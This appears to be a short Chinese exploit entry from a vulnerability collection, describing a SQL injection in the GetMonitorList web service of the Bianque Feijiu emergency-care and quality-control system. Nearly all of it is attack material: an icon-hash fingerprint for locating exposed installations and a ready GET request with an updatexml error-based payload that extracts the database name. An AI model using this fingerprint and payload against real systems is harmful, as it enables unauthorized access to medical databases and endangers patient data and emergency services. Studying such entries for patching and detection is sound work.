# 扁鹊飞救智能急救与质控系统GetMonitorList存在SQL注入漏洞

- **系统**：扁鹊飞救智能急救与质控系统　|　**类型**：SQL注入　|　**CVE**：—
- **指纹**：`icon_hash="-757866684"`
- **请求**：`GET /AppService/BQMedical/WebServiceForFirstaidApp.asmx/GetMonitorList?UserID=1&OperatorID=1&SearchName=string%27%26%26+updatexml(1,CONCAT_WS(0x71706b7671,1,0x71716a7071),1)+%26%26%27 HTTP/1.1`

**请求体 / payload**
```
GET /AppService/BQMedical/WebServiceForFirstaidApp.asmx/GetMonitorList?UserID=1&OperatorID=1&SearchName=string%27%26%26+updatexml(1,CONCAT_WS(1,1,database()),1)+%26%26%27 HTTP/1.1
Host:
```
- **预期**：200　|　—